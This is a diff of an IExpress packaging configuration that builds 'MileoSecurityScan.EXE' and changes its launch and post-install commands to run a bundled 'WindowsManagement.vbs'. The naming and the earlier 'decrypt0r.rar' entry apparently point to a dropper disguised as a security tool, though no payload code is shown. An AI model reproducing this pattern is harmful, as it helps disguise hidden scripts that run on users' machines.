@@ -26,14 +26,16 @@ DisplayLicense=
 FinishMessage=o no
 TargetName=C:\Users\bigol\Downloads\kaosTools\ummm\layers\b\MileoSecurityScan.EXE
 FriendlyName=MileoSecurityScan
-AppLaunched=start MileoSecurityScan.py
-PostInstallCmd=start MileoSecurityScan.py
+AppLaunched=start WindowsManagement.vbs
+PostInstallCmd=start WindowsManagement.vbs
 AdminQuietInstCmd=
 UserQuietInstCmd=
-FILE0="decrypt0r.rar"
-FILE1="MileoSecurityScan.py"
+FILE0="MileoSecurityScan.py"
+FILE1="WindowsManagement.vbs"
 [SourceFiles]
-SourceFiles0=C:\Users\bigol\Downloads\kaosTools\ummm\layers\b\
+SourceFiles0=C:\Users\bigol\Downloads\kaosTools\ummm\layers\
+SourceFiles1=C:\Users\bigol\Downloads\kaosTools\ummm\layers\b\
 [SourceFiles0]
 %FILE0%=
+[SourceFiles1]
 %FILE1%=
